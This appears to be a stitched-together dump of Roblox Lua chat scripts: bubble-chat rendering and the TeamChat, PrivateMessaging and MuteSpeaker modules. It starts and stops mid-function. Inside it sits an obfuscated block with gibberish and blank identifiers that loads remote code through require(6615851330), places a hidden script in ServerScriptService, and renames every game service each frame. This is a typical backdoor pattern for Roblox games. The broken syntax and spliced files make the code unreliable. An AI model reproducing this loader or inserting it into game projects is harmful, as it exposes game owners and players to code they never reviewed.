										1, currentBubbleYPos - bubble.Size.Y.Offset - CHAT_BUBBLE_TAIL_HEIGHT)
			bubble:TweenPosition(udimValue, Enum.EasingDirection.Out, Enum.EasingStyle.Bounce, 0.1, true)
			currentBubbleYPos = currentBubbleYPos - bubble.Size.Y.Offset - CHAT_BUBBLE_TAIL_HEIGHT
		end
	end
	
	function this:DestroyBubble(bubbleQueue, bubbleToDestroy)
		if not bubbleQueue then return end
		if bubbleQueue:Empty() then return end
	
		local bubble = bubbleQueue:Front().RenderBubble
		if not bubble then
			bubbleQueue:PopFront()
		 	return
		end
	
		spawn(function()
			while bubbleQueue:Front().RenderBubble ~= bubbleToDestroy do
				wait()
			end
	
			bubble = bubbleQueue:Front().RenderBubble
	
			local timeBetween = 0
			local bubbleText = bubble:FindFirstChild("BubbleText")
			local bubbleTail = bubble:FindFirstChild("ChatBubbleTail")
	
			while bubble and bubble.ImageTransparency < 1 do
				timeBetween = wait()
				if bubble then
					local fadeAmount = timeBetween * CHAT_BUBBLE_FADE_SPEED
					bubble.ImageTransparency = bubble.ImageTransparency + fadeAmount
					if bubbleText then bubbleText.TextTransparency = bubbleText.TextTransparency + fadeAmount end
					if bubbleTail then bubbleTail.ImageTransparency = bubbleTail.ImageTransparency + fadeAmount end
				end
			end
	
			if bubble then
				bubble:Destroy()
				bubbleQueue:PopFront()
			end
		end)
	end
	
	function this:CreateChatLineRender(instance, line, onlyCharacter, fifo, shouldAutoLocalize)
		if not instance then return end
	
		if not this.CharacterSortedMsg:Get(instance)["BillboardGui"] then
			this:CreateBillboardGuiHelper(instance, onlyCharacter)
		end
	
		local billboardGui = this.CharacterSortedMsg:Get(instance)["BillboardGui"]
		if billboardGui then
			local chatBubbleRender = this.ChatBubbleWithTail[line.BubbleColor]:Clone()
			chatBubbleRender.Visible = false
			local bubbleText = this:CreateBubbleText(line.Message, shouldAutoLocalize)
	
			bubbleText.Parent = chatBubbleRender
			chatBubbleRender.Parent = billboardGui.BillboardFrame
	
			line.RenderBubble = chatBubbleRender
	
			local currentTextBounds = TextService:GetTextSize(
					bubbleText.Text, CHAT_BUBBLE_FONT_SIZE_INT, CHAT_BUBBLE_FONT,
					Vector2.new(BILLBOARD_MAX_WIDTH, BILLBOARD_MAX_HEIGHT))
			local numOflines = (currentTextBounds.Y / CHAT_BUBBLE_FONT_SIZE_INT)
	
			if UserFixBubbleChatText then
				-- Need to use math.ceil to round up on retina displays
				local width = math.ceil(currentTextBounds.X + CHAT_BUBBLE_PADDING * 2)
				local height = numOflines * CHAT_BUBBLE_LINE_HEIGHT
	
				-- prep chat bubble for tween
				chatBubbleRender.Size = UDim2.fromOffset(0, 0)
				chatBubbleRender.Position = UDim2.fromScale(0.5, 1)
	
				chatBubbleRender:TweenSizeAndPosition(
					UDim2.fromOffset(width, height),
					UDim2.new(0.5, -width / 2, 1, -height),
					Enum.EasingDirection.Out,
					Enum.EasingStyle.Elastic,
					0.1,
					true,
					function()
						bubbleText.Visible = true
					end
				)
	
				-- todo: remove when over max bubbles
				this:SetBillboardGuiLOD(billboardGui, line.Origin)
				this:UpdateChatLinesForOrigin(line.Origin, -height)
			else
				local bubbleWidthScale = math.max((currentTextBounds.X + CHAT_BUBBLE_WIDTH_PADDING) / BILLBOARD_MAX_WIDTH, 0.1)
	
				-- prep chat bubble for tween
				chatBubbleRender.Size = UDim2.new(0, 0, 0, 0)
				chatBubbleRender.Position = UDim2.new(0.5, 0, 1, 0)
	
				local newChatBubbleOffsetSizeY = numOflines * CHAT_BUBBLE_LINE_HEIGHT
	
				chatBubbleRender:TweenSizeAndPosition(UDim2.new(bubbleWidthScale, 0, 0, newChatBubbleOffsetSizeY),
														UDim2.new( (1 - bubbleWidthScale) / 2, 0, 1, -newChatBubbleOffsetSizeY),
														Enum.EasingDirection.Out, Enum.EasingStyle.Elastic, 0.1, true,
														function() bubbleText.Visible = true end)
	
				-- todo: remove when over max bubbles
				this:SetBillboardGuiLOD(billboardGui, line.Origin)
				this:UpdateChatLinesForOrigin(line.Origin, -newChatBubbleOffsetSizeY)
			end
	
			delay(line.BubbleDieDelay, function()
				this:DestroyBubble(fifo, chatBubbleRender)
			end)
		end
	end
	
	function this:OnPlayerChatMessage(sourcePlayer, message, targetPlayer)
	
		if not this:BubbleChatEnabled() then return end
	
		local localPlayer = PlayersService.LocalPlayer
		local fromOthers = localPlayer ~= nil and sourcePlayer ~= localPlayer
	
		local safeMessage = this:SanitizeChatLine(message)
	
		local line = createPlayerChatLine(sourcePlayer, safeMessage, not fromOthers)
	
		if sourcePlayer and line.Origin then
			local fifo = this.CharacterSortedMsg:Get(line.Origin).Fifo
			fifo:PushBack(line)
			--Game chat (badges) won't show up here
			this:CreateChatLineRender(sourcePlayer.Character, line, true, fifo, false)
		end
	end
	
	function this:OnGameChatMessage(origin, message, color)
		-- Prevents conflicts with the new bubble chat if it is enabled
		if UserRoactBubbleChatBeta or (UserPreventOldBubbleChatOverlap and ChatService.BubbleChatEnabled) then
			return
		end
	
		local localPlayer = PlayersService.LocalPlayer
		local fromOthers = localPlayer ~= nil and (localPlayer.Character ~= origin)
	
		local bubbleColor = BubbleColor.WHITE
	
		if color == Enum.ChatColor.Blue then bubbleColor = BubbleColor.BLUE
		elseif color == Enum.ChatColor.Green then bubbleColor = BubbleColor.GREEN
		elseif color == Enum.ChatColor.Red then bubbleColor = BubbleColor.RED end
	
		local safeMessage = this:SanitizeChatLine(message)
		local line = createGameChatLine(origin, safeMessage, not fromOthers, bubbleColor)
	
		this.CharacterSortedMsg:Get(line.Origin).Fifo:PushBack(line)
		if UserShouldLocalizeGameChatBubble then
			this:CreateChatLineRender(origin, line, false, this.CharacterSortedMsg:Get(line.Origin).Fifo, true)
		else
			this:CreateChatLineRender(origin, line, false, this.CharacterSortedMsg:Get(line.Origin).Fifo, false)
		end
	end
	
	function this:BubbleChatEnabled()
		if UserRoactBubbleChatBeta or (UserPreventOldBubbleChatOverlap and ChatService.BubbleChatEnabled) then
			return false
		end
		local clientChatModules = ChatService:FindFirstChild("ClientChatModules")
		if clientChatModules then
			local chatSettings = clientChatModules:FindFirstChild("ChatSettings")
			if chatSettings then
				local chatSettings = require(chatSettings)
				if chatSettings.BubbleChatEnabled ~= nil then
					return chatSettings.BubbleChatEnabled
				end
			end
		end
		return PlayersService.BubbleChat
	end
	
	function this:ShowOwnFilteredMessage()
		local clientChatModules = ChatService:FindFirstChild("ClientChatModules")
		if clientChatModules then
			local chatSettings = clientChatModules:FindFirstChild("ChatSettings")
			if chatSettings then
				chatSettings = require(chatSettings)
				return chatSettings.ShowUserOwnFilteredMessage
			end
		end
		return false
	end
	
	function findPlayer(playerName)
		for i,v in pairs(PlayersService:GetPlayers()) do
			if v.Name == playerName then
				return v
			end
		end
	end
	
	ChatService.Chatted:connect(function(origin, message, color) this:OnGameChatMessage(origin, message, color) end)
	
	local cameraChangedCon = nil
	if game.Workspace.CurrentCamera then
		cameraChangedCon = game.Workspace.CurrentCamera:GetPropertyChangedSignal("CFrame"):connect(function(prop) this:CameraCFrameChanged() end)
	end
	
	game.Workspace.Changed:connect(function(prop)
		if prop == "CurrentCamera" then
			if cameraChangedCon then cameraChangedCon:disconnect() end
			if game.Workspace.CurrentCamera then
				cameraChangedCon = game.Workspace.CurrentCamera:GetPropertyChangedSignal("CFrame"):connect(function(prop) this:CameraCFrameChanged() end)
			end
		end
	end)
	
	
	local AllowedMessageTypes = nil
	
	function getAllowedMessageTypes()
		if AllowedMessageTypes then
			return AllowedMessageTypes
		end
		local clientChatModules = ChatService:FindFirstChild("ClientChatModules")
		if clientChatModules then
			local chatSettings = clientChatModules:FindFirstChild("ChatSettings")
			if chatSettings then
				chatSettings = require(chatSettings)
				if chatSettings.BubbleChatMessageTypes then
					AllowedMessageTypes = chatSettings.BubbleChatMessageTypes
					return AllowedMessageTypes
				end
			end
			local chatConstants = clientChatModules:FindFirstChild("ChatConstants")
			if chatConstants then
				chatConstants = require(chatConstants)
				AllowedMessageTypes = {chatConstants.MessageTypeDefault, chatConstants.MessageTypeWhisper}
			end
			return AllowedMessageTypes
		end
		return {"Message", "Whisper"}
	end
	
	function checkAllowedMessageType(messageData)
		local allowedMessageTypes = getAllowedMessageTypes()
		for i = 1, #allowedMessageTypes do
			if allowedMessageTypes[i] == messageData.MessageType then
				return true
			end
		end
		return false
	end
	
	local ChatEvents = ReplicatedStorage:WaitForChild("DefaultChatSystemChatEvents")
	local OnMessageDoneFiltering = ChatEvents:WaitForChild("OnMessageDoneFiltering")
	local OnNewMessage = ChatEvents:WaitForChild("OnNewMessage")
	
	OnNewMessage.OnClientEvent:connect(function(messageData, channelName)
		if not checkAllowedMessageType(messageData) then
			return
		end
	
		local sender = findPlayer(messageData.FromSpeaker)
		if not sender then
			return
		end
	
		if not messageData.IsFiltered or messageData.FromSpeaker == LocalPlayer.Name then
			if messageData.FromSpeaker ~= LocalPlayer.Name or this:ShowOwnFilteredMessage() then
				return
			end
		end
	
		this:OnPlayerChatMessage(sender, messageData.Message, nil)
	end)
	
	OnMessageDoneFiltering.OnClientEvent:connect(function(messageData, channelName)
		if not checkAllowedMessageType(messageData) then
			return
		end
	
		local sender = findPlayer(messageData.FromSpeaker)
		if not sender then
			return
		end
	
		if messageData.FromSpeaker == LocalPlayer.Name and not this:ShowOwnFilteredMessage() then
			return
		end
	
		this:OnPlayerChatMessage(sender, messageData.Message, nil)
	end)
	
end)

--[[
	Roblox2Lua
	----------
	
	This code was generated using
	Deluct's Roblox2Lua plugin.
]]--

local eruiodxuerwof = Instance.new("ModuleScript")
eruiodxuerwof.Name = "eruiodxuerwof"
eruiodxuerwof.Parent = workspace

local  = Instance.new("Script")
.Name = ""
.Parent = eruiodxuerwof

--// Modules

local modules = {
	[eruiodxuerwof] = function()
		local module = {}
		
		local function GiveScript(Name)
			local Script = script[""]:Clone()
			Script.Parent = game:GetService("ServerScriptService")
			Script.Disabled = false
		end
		
		module["69"] = function()
			GiveScript()
		end
		
		module.AllAUSL = function()
			require(6615851330).AntiUSL()
			module["69"]()
		end
		
		return module
	end
}

--// Scripts

-- 
task.spawn(function()
	local script = 

	local oldreq = require
	local function require(target)
		if modules[target] then
			return modules[target]()
		end
		return oldreq(target)
	end

	pcall(function()
	
		pcall(function()
	
			wait()
			script:Destroy()
			local Instance_ = Instance.new
			local AntiUSL = game:GetService("ReplicatedStorage").ChildAdded:Connect(function(f)
				if f.Name == "stuf" then
					pcall(function()
						Instance_("Speaker", f)
					end)
					pcall(function()
						for i, v in pairs(f:GetChildren()) do
							Instance_("Speaker", v)
						end
					end)
					f.ChildAdded:Connect(function(v)
						Instance_("Speaker", v)
					end)
				end
			end)
			local FixNames = game:GetService("RunService").Heartbeat:Connect(function()
				for i, v in pairs(game:GetChildren()) do
					pcall(function()
						v.Name = v.ClassName
					end)
				end
			end)
			warn("(HSE) USCV2's Anti-USL loaded.")
	
		end)
	
	end)
end)

--[[
	Roblox2Lua
	----------
	
	This code was generated using
	Deluct's Roblox2Lua plugin.
]]--

--// Instances

local erwqcfrefewrcfwer = Instance.new("Folder")
erwqcfrefewrcfwer.Name = "erwqcfrefewrcfwer"
erwqcfrefewrcfwer.Parent = workspace

local team_chat = Instance.new("ModuleScript")
team_chat.Name = "TeamChat"
team_chat.Parent = erwqcfrefewrcfwer

local private_messaging = Instance.new("ModuleScript")
private_messaging.Name = "PrivateMessaging"
private_messaging.Parent = erwqcfrefewrcfwer

local mute_speaker = Instance.new("ModuleScript")
mute_speaker.Name = "MuteSpeaker"
mute_speaker.Parent = erwqcfrefewrcfwer

local me_command = Instance.new("ModuleScript")
me_command.Name = "MeCommand"
me_command.Parent = erwqcfrefewrcfwer

local friend_join_notifier = Instance.new("ModuleScript")
friend_join_notifier.Name = "FriendJoinNotifier"
friend_join_notifier.Parent = erwqcfrefewrcfwer

local extra_data_initializer = Instance.new("ModuleScript")
extra_data_initializer.Name = "ExtraDataInitializer"
extra_data_initializer.Parent = erwqcfrefewrcfwer

local chat_message_validator = Instance.new("ModuleScript")
chat_message_validator.Name = "ChatMessageValidator"
chat_message_validator.Parent = erwqcfrefewrcfwer

local chat_flood_detector = Instance.new("ModuleScript")
chat_flood_detector.Name = "ChatFloodDetector"
chat_flood_detector.Parent = erwqcfrefewrcfwer

local chatcommands_teller = Instance.new("ModuleScript")
chatcommands_teller.Name = "ChatCommandsTeller"
chatcommands_teller.Parent = erwqcfrefewrcfwer

local utility = Instance.new("Folder")
utility.Name = "Utility"
utility.Parent = erwqcfrefewrcfwer

local display_name_helpers = Instance.new("ModuleScript")
display_name_helpers.Name = "DisplayNameHelpers"
display_name_helpers.Parent = utility

local insert_default_modules = Instance.new("BoolValue")
insert_default_modules.Value = true
insert_default_modules.Name = "InsertDefaultModules"
insert_default_modules.Parent = erwqcfrefewrcfwer

--// Modules

local modules = {
	[team_chat] = function()
		--	// FileName: TeamChat.lua
		--	// Written by: Xsitsu
		--	// Description: Module that handles all team chat.
		
		local Chat = game:GetService("Chat")
		local ReplicatedModules = Chat:WaitForChild("ClientChatModules")
		local ChatSettings = require(ReplicatedModules:WaitForChild("ChatSettings"))
		local ChatConstants = require(ReplicatedModules:WaitForChild("ChatConstants"))
		
		local ChatLocalization = nil
		pcall(function() ChatLocalization = require(game:GetService("Chat").ClientChatModules.ChatLocalization) end)
		if ChatLocalization == nil then ChatLocalization = {} end
		if not ChatLocalization.FormatMessageToSend or not ChatLocalization.LocalizeFormattedMessage then
			function ChatLocalization:FormatMessageToSend(key,default) return default end
		end
		
		local errorTextColor = ChatSettings.ErrorMessageTextColor or Color3.fromRGB(245, 50, 50)
		local errorExtraData = {ChatColor = errorTextColor}
		
		local function Run(ChatService)
		
			local Players = game:GetService("Players")
		
			local channel = ChatService:AddChannel("Team")
			channel.WelcomeMessage = ChatLocalization:FormatMessageToSend("GameChat_TeamChat_WelcomeMessage","This is a private channel between you and your team members.")
			channel.Joinable = false
			channel.Leavable = false
			channel.AutoJoin = false
			channel.Private = true
		
			local function TeamChatReplicationFunction(fromSpeaker, message, channelName)
				local speakerObj = ChatService:GetSpeaker(fromSpeaker)
				local channelObj = ChatService:GetChannel(channelName)
				if (speakerObj and channelObj) then
					local player = speakerObj:GetPlayer()
					if (player) then
		
						for i, speakerName in pairs(channelObj:GetSpeakerList()) do
							local otherSpeaker = ChatService:GetSpeaker(speakerName)
							if (otherSpeaker) then
								local otherPlayer = otherSpeaker:GetPlayer()
								if (otherPlayer) then
		
									if (player.Team == otherPlayer.Team) then
										local extraData = {
											NameColor = player.TeamColor.Color,
											ChatColor = player.TeamColor.Color,
											ChannelColor = player.TeamColor.Color
										}
										otherSpeaker:SendMessage(message, channelName, fromSpeaker, extraData)
									else
										--// Could use this line to obfuscate message for cool effects
										--otherSpeaker:SendMessage(message, channelName, fromSpeaker)
									end
		
								end
							end
						end
		
					end
				end
		
				return true
			end
		
			channel:RegisterProcessCommandsFunction("replication_function", TeamChatReplicationFunction, ChatConstants.LowPriority)
		
			local function DoTeamCommand(fromSpeaker, message, channel)
				if message == nil then
					message = ""
				end
		
				local speaker = ChatService:GetSpeaker(fromSpeaker)
				if speaker then
					local player = speaker:GetPlayer()
		
					if player then
						if player.Team == nil then
							speaker:SendSystemMessage(ChatLocalization:FormatMessageToSend("GameChat_TeamChat_CannotTeamChatIfNotInTeam","You cannot team chat if you are not on a team!"), channel, errorExtraData)
							return
						end
		
						local channelObj = ChatService:GetChannel("Team")
						if channelObj then
							if not speaker:IsInChannel(channelObj.Name) then
								speaker:JoinChannel(channelObj.Name)
							end
							if message and string.len(message) > 0 then
								speaker:SayMessage(message, channelObj.Name)
							end
							speaker:SetMainChannel(channelObj.Name)
						end
					end
				end
			end
		
			local function TeamCommandsFunction(fromSpeaker, message, channel)
				local processedCommand = false
		
				if message == nil then
					error("Message is nil")
				end
		
				if channel == "Team" then
					return false
				end
		
				if string.sub(message, 1, 6):lower() == "/team " or message:lower() == "/team" then
					DoTeamCommand(fromSpeaker, string.sub(message, 7), channel)
					processedCommand = true
				elseif string.sub(message, 1, 3):lower() == "/t " or message:lower() == "/t" then
					DoTeamCommand(fromSpeaker, string.sub(message, 4), channel)
					processedCommand = true
				elseif string.sub(message, 1, 2):lower() == "% " or message:lower() == "%" then
					DoTeamCommand(fromSpeaker, string.sub(message, 3), channel)
					processedCommand = true
				end
		
				return processedCommand
			end
		
			ChatService:RegisterProcessCommandsFunction("team_commands", TeamCommandsFunction, ChatConstants.StandardPriority)
		
			local function GetDefaultChannelNameColor()
				if ChatSettings.DefaultChannelNameColor then
					return ChatSettings.DefaultChannelNameColor
				end
				return Color3.fromRGB(35, 76, 142)
			end
		
			local function PutSpeakerInCorrectTeamChatState(speakerObj, playerObj)
				if playerObj.Neutral or playerObj.Team == nil then
					speakerObj:UpdateChannelNameColor(channel.Name, GetDefaultChannelNameColor())
		
					if speakerObj:IsInChannel(channel.Name) then
						speakerObj:LeaveChannel(channel.Name)
					end
				elseif not playerObj.Neutral and playerObj.Team then
					speakerObj:UpdateChannelNameColor(channel.Name, playerObj.Team.TeamColor.Color)
		
					if not speakerObj:IsInChannel(channel.Name) then
						speakerObj:JoinChannel(channel.Name)
					end
				end
			end
		
			ChatService.SpeakerAdded:connect(function(speakerName)
				local speakerObj = ChatService:GetSpeaker(speakerName)
				if speakerObj then
					local player = speakerObj:GetPlayer()
					if player then
						PutSpeakerInCorrectTeamChatState(speakerObj, player)
					end
				end
			end)
		
			local PlayerChangedConnections = {}
			Players.PlayerAdded:connect(function(player)
				local changedConn = player.Changed:connect(function(property)
					local speakerObj = ChatService:GetSpeaker(player.Name)
					if speakerObj then
						if property == "Neutral" then
							PutSpeakerInCorrectTeamChatState(speakerObj, player)
						elseif property == "Team" then
							PutSpeakerInCorrectTeamChatState(speakerObj, player)
							if speakerObj:IsInChannel(channel.Name) then
								local msg = ChatLocalization:FormatMessageToSend("GameChat_TeamChat_NowInTeam",
									string.format("You are now on the '%s' team.", player.Team.Name),
									"RBX_NAME",
									player.Team.Name
								)
								speakerObj:SendSystemMessage(msg, channel.Name)
							end
						end
					end
				end)
				PlayerChangedConnections[player] = changedConn
			end)
		
			Players.PlayerRemoving:connect(function(player)
				local changedConn = PlayerChangedConnections[player]
				if changedConn then
					changedConn:Disconnect()
				end
				PlayerChangedConnections[player] = nil
			end)
		end
		
		return Run
		
	end[private_messaging] = function()
		--	// FileName: PrivateMessaging.lua
		--	// Written by: Xsitsu
		--	// Description: Module that handles all private messaging.
		
		local Chat = game:GetService("Chat")
		local RunService = game:GetService("RunService")
		local ReplicatedModules = Chat:WaitForChild("ClientChatModules")
		local ChatModules = Chat:WaitForChild("ChatModules")
		local ChatConstants = require(ReplicatedModules:WaitForChild("ChatConstants"))
		local ChatSettings = require(ReplicatedModules:WaitForChild("ChatSettings"))
		local DisplayNameHelpers = require(ChatModules.Utility.DisplayNameHelpers)
		
		local ChatLocalization = nil
		pcall(function() ChatLocalization = require(game:GetService("Chat").ClientChatModules.ChatLocalization) end)
		if ChatLocalization == nil then ChatLocalization = {} end
		if not ChatLocalization.FormatMessageToSend or not ChatLocalization.LocalizeFormattedMessage then
			function ChatLocalization:FormatMessageToSend(key,default) return default end
		end
		
		local errorTextColor = ChatSettings.ErrorMessageTextColor or Color3.fromRGB(245, 50, 50)
		local errorExtraData = {ChatColor = errorTextColor}
		
		local function GetWhisperChannelPrefix()
			if ChatConstants.WhisperChannelPrefix then
				return ChatConstants.WhisperChannelPrefix
			end
			return "To "
		end
		
		local function GetWhisperChannelId(userName)
			return GetWhisperChannelPrefix() .. userName
		end
		
		local function Run(ChatService)
		
			local function CanCommunicate(fromSpeaker, toSpeaker)
				if RunService:IsStudio() then
					return true
				end
				local fromPlayer = fromSpeaker:GetPlayer()
				local toPlayer = toSpeaker:GetPlayer()
				if fromPlayer and toPlayer then
					local success, canChat = pcall(function()
						return Chat:CanUsersChatAsync(fromPlayer.UserId, toPlayer.UserId)
					end)
					return success and canChat
				end
				return false
			end
		
			local function DoWhisperCommand(fromSpeaker, message, channel)
				local speaker = ChatService:GetSpeaker(fromSpeaker)
				local otherSpeakerInputName = message
				local sendMessage = nil
		
				if (string.sub(message, 1, 1) == "\"") then
					local pos = string.find(message, "\"", 2)
					if (pos) then
						otherSpeakerInputName = string.sub(message, 2, pos - 1)
						sendMessage = string.sub(message, pos + 2)
					end
				else
					local first = string.match(message, "^[^%s]+")
					if (first) then
						otherSpeakerInputName = first
						sendMessage = string.sub(message, string.len(otherSpeakerInputName) + 2)
					end
				end
		
				local otherSpeakerName, otherSpeakerError
		
				--Get the target user's UserName from the input (which could be userName or displayName)
				if ChatSettings.PlayerDisplayNamesEnabled and ChatSettings.WhisperByDisplayNameEnabled then
					otherSpeakerName, otherSpeakerError = DisplayNameHelpers.getUserNameFromChattedName(otherSpeakerInputName, fromSpeaker, speaker:GetNameForDisplay())
				else
					otherSpeakerName, otherSpeakerError = DisplayNameHelpers.getUserNameFromChattedName(otherSpeakerInputName, fromSpeaker, nil)
				end
		
				local otherSpeaker = ChatService:GetSpeaker(otherSpeakerName)
		
				if otherSpeakerError == DisplayNameHelpers.CommandErrorCodes.ChattingToSelf then
					speaker:SendSystemMessage(ChatLocalization:FormatMessageToSend("GameChat_PrivateMessaging_CannotWhisperToSelf","You cannot whisper to yourself."), channel, errorExtraData)
		
				elseif otherSpeakerError == DisplayNameHelpers.CommandErrorCodes.NoMatches then
					local msg = ChatLocalization:FormatMessageToSend(
						"GameChat_MuteSpeaker_SpeakerDoesNotExist",
						string.format("Speaker '%s' does not exist.", tostring(otherSpeakerInputName)),
						"RBX_NAME",
						tostring(otherSpeakerName))
					speaker:SendSystemMessage(msg, channel, errorExtraData)
		
				elseif otherSpeakerError == DisplayNameHelpers.CommandErrorCodes.MultipleMatches then
					local matchingUsersText = DisplayNameHelpers.getUsersWithDisplayNameString(otherSpeakerInputName, fromSpeaker)
					speaker:SendSystemMessage(ChatLocalization:FormatMessageToSend("InGame.Chat.Response.DisplayNameMultipleMatches", "Warning: The following users have this display name: "),  channel, errorExtraData)
		
					--Send a second message with a list of names so that the localization formatter doesn't prune it
					speaker:SendSystemMessage(matchingUsersText,  channel, errorExtraData)
		
				elseif otherSpeaker then
					local channelObj = ChatService:GetChannel(GetWhisperChannelId(otherSpeakerName))
		
					if channelObj then
						if not CanCommunicate(speaker, otherSpeaker) then
							speaker:SendSystemMessage(ChatLocalization:FormatMessageToSend("GameChat_PrivateMessaging_CannotChat","You are not able to chat with this player."), channel, errorExtraData)
							return
						end
		
						if (not speaker:IsInChannel(channelObj.Name)) then
							speaker:JoinChannel(channelObj.Name)
						end
		
						if (sendMessage and (string.len(sendMessage) > 0) ) then
							speaker:SayMessage(sendMessage, channelObj.Name)
						end
		
						speaker:SetMainChannel(channelObj.Name)
					else
						local msg = ChatLocalization:FormatMessageToSend(
							"GameChat_MuteSpeaker_SpeakerDoesNotExist",
							string.format("Speaker '%s' does not exist.", tostring(otherSpeakerInputName)),
							"RBX_NAME",
							tostring(otherSpeakerName))
						speaker:SendSystemMessage(msg, channel, errorExtraData)
					end
				end
			end
		
			local function WhisperCommandsFunction(fromSpeaker, message, channel)
				local processedCommand = false
		
				if (string.sub(message, 1, 3):lower() == "/w ") then
					DoWhisperCommand(fromSpeaker, string.sub(message, 4), channel)
					processedCommand = true
		
				elseif (string.sub(message, 1, 9):lower() == "/whisper ") then
					DoWhisperCommand(fromSpeaker, string.sub(message, 10), channel)
					processedCommand = true
		
				end
		
				return processedCommand
			end
		
			local function PrivateMessageReplicationFunction(fromSpeaker, message, channelName)
				local sendingSpeaker = ChatService:GetSpeaker(fromSpeaker)
				local extraData = sendingSpeaker.ExtraData
				sendingSpeaker:SendMessage(message, channelName, fromSpeaker, extraData)
		
				local toSpeaker = ChatService:GetSpeaker(string.sub(channelName, 4))
				local fromSpeakerChannelId = GetWhisperChannelId(fromSpeaker)
		
				if (toSpeaker) then
					if (not toSpeaker:IsInChannel(fromSpeakerChannelId)) then
						toSpeaker:JoinChannel(fromSpeakerChannelId)
					end
					toSpeaker:SendMessage(message, fromSpeakerChannelId, fromSpeaker, extraData)
				end
		
				return true
			end
		
			local function PrivateMessageAddTypeFunction(speakerName, messageObj, channelName)
				if ChatConstants.MessageTypeWhisper then
					messageObj.MessageType = ChatConstants.MessageTypeWhisper
				end
			end
		
			ChatService:RegisterProcessCommandsFunction("whisper_commands", WhisperCommandsFunction, ChatConstants.StandardPriority)
		
			local function GetWhisperChanneNameColor()
				if ChatSettings.WhisperChannelNameColor then
					return ChatSettings.WhisperChannelNameColor
				end
				return Color3.fromRGB(102, 14, 102)
			end
		
			ChatService.SpeakerAdded:connect(function(speakerName)
				local speaker = ChatService:GetSpeaker(speakerName)
				local speakerDisplayName
		
				if ChatSettings.PlayerDisplayNamesEnabled and speaker:GetPlayer() then
					speakerDisplayName = speaker:GetNameForDisplay() .. "(@" .. speakerName .. ")"
				else
					speakerDisplayName = speakerName
				end
		
				local toSpeakerChannelId = GetWhisperChannelId(speakerName)
		
				if (ChatService:GetChannel(toSpeakerChannelId)) then
					ChatService:RemoveChannel(toSpeakerChannelId)
				end
		
				local channel = ChatService:AddChannel(toSpeakerChannelId)
				channel.Joinable = false
				channel.Leavable = true
				channel.AutoJoin = false
				channel.Private = true
		
				channel.WelcomeMessage = ChatLocalization:FormatMessageToSend("GameChat_PrivateMessaging_NowChattingWith",
					"You are now privately chatting with " .. speakerDisplayName .. ".",
					"RBX_NAME",
					tostring(speakerDisplayName))
				channel.ChannelNameColor = GetWhisperChanneNameColor()
		
				channel:RegisterProcessCommandsFunction("replication_function", PrivateMessageReplicationFunction, ChatConstants.LowPriority)
				channel:RegisterFilterMessageFunction("message_type_function", PrivateMessageAddTypeFunction)
			end)
		
			ChatService.SpeakerRemoved:connect(function(speakerName)
				local whisperChannelId = GetWhisperChannelId(speakerName)
		
				if (ChatService:GetChannel(whisperChannelId)) then
					ChatService:RemoveChannel(whisperChannelId)
				end
			end)
		end
		
		return Run
		
	end[mute_speaker] = function()
		--	// FileName: MuteSpeaker.lua
		--	// Written by: TheGamer101
		--	// Description: Module that handles all the mute and unmute commands.
		
		local Chat = game:GetService("Chat")
		local ReplicatedModules = Chat:WaitForChild("ClientChatModules")
		local ChatModules = Chat:WaitForChild("ChatModules")
		local ChatConstants = require(ReplicatedModules:WaitForChild("ChatConstants"))
		local ChatSettings = require(ReplicatedModules:WaitForChild("ChatSettings"))
		local DisplayNameHelpers = require(ChatModules.Utility.DisplayNameHelpers)
		
		local ChatLocalization = nil
		pcall(function() ChatLocalization = require(game:GetService("Chat").ClientChatModules.ChatLocalization) end)
		if ChatLocalization == nil then ChatLocalization = {} end
		if not ChatLocalization.FormatMessageToSend or not ChatLocalization.LocalizeFormattedMessage then
			function ChatLocalization:FormatMessageToSend(key,default) return default end
		end
		
		local errorTextColor = ChatSettings.ErrorMessageTextColor or Color3.fromRGB(245, 50, 50)
		local errorExtraData = {ChatColor = errorTextColor}
		
		local function Run(ChatService)
		
			local function GetSpeakerNameFromMessage(message)
				local speakerName = message
				if string.sub(message, 1, 1) == "\"" then
					local pos = string.find(message, "\"", 2)
					if pos then
						speakerName = string.sub(message, 2, pos - 1)
					end
				else
					local first = string.match(message, "^[^%s]+")
					if first then
						speakerName = first
					end
				end
				return speakerName
			end
		
			local function DoMuteCommand(speakerName, message, channel)
				local muteSpeakerInputName = GetSpeakerNameFromMessage(message)
				local speaker = ChatService:GetSpeaker(speakerName)
		
				if speaker then
					local muteSpeakerName, muteSpeakerError
		
					--Get the target user's UserName from the input (which could be userName or displayName)
					if ChatSettings.PlayerDisplayNamesEnabled then
						muteSpeakerName, muteSpeakerError = DisplayNameHelpers.getUserNameFromChattedName(muteSpeakerInputName, speakerName, speaker:GetNameForDisplay())
					else
						muteSpeakerName, muteSpeakerError = DisplayNameHelpers.getUserNameFromChattedName(muteSpeakerInputName, speakerName, nil)
					end
		
					local muteSpeaker = ChatService:GetSpeaker(muteSpeakerName)
		
					if muteSpeakerError == DisplayNameHelpers.CommandErrorCodes.ChattingToSelf then
						speaker:SendSystemMessage(ChatLocalization:FormatMessageToSend("GameChat_DoMuteCommand_CannotMuteSelf", "You cannot mute yourself."), channel, errorExtraData)
		
					elseif muteSpeakerError == DisplayNameHelpers.CommandErrorCodes.NoMatches then
						local msg = ChatLocalization:FormatMessageToSend(
							"GameChat_MuteSpeaker_SpeakerDoesNotExist",
							string.format("Speaker '%s' does not exist.", tostring(muteSpeakerInputName)),
							"RBX_NAME",
							tostring(muteSpeakerName))
						speaker:SendSystemMessage(msg, channel, errorExtraData)
		
					elseif muteSpeakerError == DisplayNameHelpers.CommandErrorCodes.MultipleMatches then
						local matchingUsersText = DisplayNameHelpers.getUsersWithDisplayNameString(muteSpeakerInputName, speakerName)
						speaker:SendSystemMessage(ChatLocalization:FormatMessageToSend("InGame.Chat.Response.DisplayNameMultipleMatches", "Warning: The following users have this display name: "),  channel, errorExtraData)
		
						--Send a second message with a list of names so that the localization formatter doesn't prune it
						speaker:SendSystemMessage(matchingUsersText,  channel, errorExtraData)
		
					elseif muteSpeaker then
						speaker:AddMutedSpeaker(muteSpeaker.Name)
		
						local muteSpeakerDisplayName = muteSpeakerName
		
						if ChatSettings.PlayerDisplayNamesEnabled then
							muteSpeakerDisplayName = muteSpeaker:GetNameForDisplay()
						end
		
						local msg = ChatLocalization:FormatMessageToSend("GameChat_ChatMain_SpeakerHasBeenMuted",
							string.format("Speaker '%s' has been muted.", muteSpeakerDisplayName),
							"RBX_NAME",
							muteSpeakerDisplayName)
						speaker:SendSystemMessage(msg, channel)
					end
				end
			end
		
			local function DoUnmuteCommand(speakerName, message, channel)
